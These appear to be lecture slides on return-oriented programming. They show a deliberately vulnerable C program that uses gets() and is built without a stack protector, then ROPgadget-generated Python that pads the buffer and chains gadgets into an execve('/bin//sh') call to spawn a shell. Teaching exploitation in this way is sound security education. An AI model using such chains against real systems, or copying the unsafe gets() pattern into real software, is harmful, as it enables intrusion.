### example vulnerable application

```c
void vulnerable() {
    char str[128];
    printf("Input: ");
    gets(str);
}

int main() {vulnerable();}
```

<hr>

`gcc -Os -fno-stack-protector -static -no-pie vulnerable.c -o vulnerable`

### finding ROP chains (ROPgadget) {.smaller}

```
ROPgadget --binary vulnerable --ropchain --silent
```
<hr>
(after removing extra lines)
<hr>
```python
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b''

p += pack('<Q', 0x0000000000409ece) # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e0) # @ .data
p += pack('<Q', 0x0000000000447d27) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000044a275) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000409ece) # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e8) # @ .data + 8
p += pack('<Q', 0x000000000043cef0) # xor rax, rax ; ret
...
p += pack('<Q', 0x0000000000470fd0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470fd0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470fd0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000401c14) # syscall
```

### using the ROPgadget chain (1)

:::: {.columns}

::: {.column width=40%}

```gnuassembler
vulnerable:
  endbr64 
  sub    $0x88,%rsp
  lea    input_str(%rip),%rsi
  mov    $0x1,%edi
  xor    %eax,%eax
  call   ___printf_chk
  mov    %rsp,%rdi
  call   _IO_gets
  add    $0x88,%rsp
  ret    
```

:::

::: {.column width=59%}

<!-- FIXME: latex version of this diagram -->

<table class="stackdiag">
<tr><td class="nobox small">(highest address)</td></tr>
<tr><td class="nobox">&nbsp;</td><td class="emptycol"></td><td rowspan="2" class="attack bottomdot"">rest of ROP chain</td></tr>
<tr><td class="nobox">caller's stuff</td></tr>
<tr><td class="ra">vulnerable return address</td><td class="emptycol"></td><td class="attack topdot">start of ROP chain</td></tr>
<tr><td class="buffer" style="height: 5em">0x88 byte buffer</td><td class="emptycol"></td><td>padding</td></tr>
<tr><td class="nobox small">(lowest address)</td><td class="emptycol"></td></tr>
</table>

:::

::::

### using the ROPgadget chain (1)

:::: {.columns}

::: {.column width=39%}

<!-- FIXME: latex version of this diagram -->

<table class="stackdiag smaller">
<tr><td class="nobox small">(highest address)</td></tr>
<tr><td class="nobox">&nbsp;</td><td class="emptycol"></td><td rowspan="2" class="attack bottomdot"">rest of ROP chain</td></tr>
<tr><td class="nobox">caller's stuff</td></tr>
<tr><td class="ra">vulnerable return address</td><td class="emptycol"></td><td class="attack topdot">start of ROP chain</td></tr>
<tr><td class="buffer" style="height: 5em">0x88 byte buffer</td><td class="emptycol"></td><td>padding</td></tr>
<tr><td class="nobox small">(lowest address)</td><td class="emptycol"></td></tr>
</table>

:::

::: {.column width=59%}

```{.python code-line-numbers="|3-4|10|12-16"}
from struct import pack

# Padding goes here
p = b'A' * 0x88 # <-- modified

p += pack('<Q', 0x0000000000409ece) # pop rsi ; ret
...
p += pack('<Q', 0x0000000000401c14) # syscall

to_program.write(p + b'\n')

# wait for shell to start
    # hopefully this is long enough
time.sleep(1)
to_program.write('my_malicious_command\n')
```

:::

::::

### ROPgadget chain goal

:::: {.columns}

::: {.column}

```gnuassembler
  # arg 1: program
  leaq bin_sh, %rdi
  # arg 2: argv
  leaq empty, %rsi
  # arg 3: env vars
  leaq empty, %rdx
  # op = execve (0x3b)
  mov $0x3b, %rax
  syscall

bin_sh: .ascii "/bin//sh\0"
empty: .ascii "\0"
```

:::

::: {.column .fragment}

```gnuassembler
# "/bin//sh" --> temp
mov $0x68732f2f6e69622f, temp
mov $0, temp+8
leaq temp, %rdi
leaq temp+8, %rsi
leaq temp+8, %rdx
mov $0x3b, %rax
syscall
```

:::

::::

::: {.myoverbox .vlow .fragment}

ROP chain will copy to `temp` location</br>
avoids requiring knowing address of ROP chain

:::


### ROPgadget chain construction (1)

:::: {.columns}

::: {.column width=44%}

```{.gnuassembler code-line-numbers="2"}
# "/bin//sh" --> temp
mov $0x68732f2f6e69622f, temp
mov $0, temp+8
leaq temp, %rdi
leaq temp+8, %rsi
leaq temp+8, %rdx
mov $0x3b, %rax
syscall
```

:::

::: {.column width=55%}

```{.python code-line-numbers=true}
p += pack('<Q', 0x0000000000409ece)
    # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e0)
    # @ .data
p += pack('<Q', 0x0000000000447d27)
    # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000044a275)
    # mov qword ptr [rsi], rax ; ret
    # ATT: mov %rax, (%rsi); ret
```

:::

::::

### ROPgadget chain construction (2)

:::: {.columns}

::: {.column width=44%}

```{.gnuassembler code-line-numbers="4-6"}
# "/bin//sh" --> temp
mov $0x68732f2f6e69622f, temp
mov $0, temp+8
leaq temp, %rdi
leaq temp+8, %rsi
leaq temp+8, %rdx
mov $0x3b, %rax
syscall
```

:::

::: {.column width=55%}

```{.python code-line-numbers=true}
p += pack('<Q', 0x0000000000401e5f)
    # pop rdi ; ret
p += pack('<Q', 0x00000000004c50e0)
    # @ .data
p += pack('<Q', 0x0000000000409ece)
    # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e8)
    # @ .data + 8
p += pack('<Q', 0x000000000040165e)
    # pop rdx ; ret
p += pack('<Q', 0x00000000004c50e8)
    # @ .data + 8
```

:::

::::

### ROPgadget chain construction (3)

:::: {.columns}

::: {.column width=44%}

```{.gnuassembler code-line-numbers="7-8"}
# "/bin//sh" --> temp
mov $0x68732f2f6e69622f, temp
mov $0, temp+8
leaq temp, %rdi
leaq temp+8, %rsi
leaq temp+8, %rdx
mov $0x3b, %rax
syscall
```

:::

::: {.column width=55%}

```{.python code-line-numbers=true}
p += pack('<Q', 0x000000000043cef0)
    # xor rax, rax ; ret
p += pack('<Q', 0x0000000000470fd0)
    # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470fd0)
    # add rax, 1 ; ret
...
p += pack('<Q', 0x0000000000401c14)
    # syscall
```

:::

::::
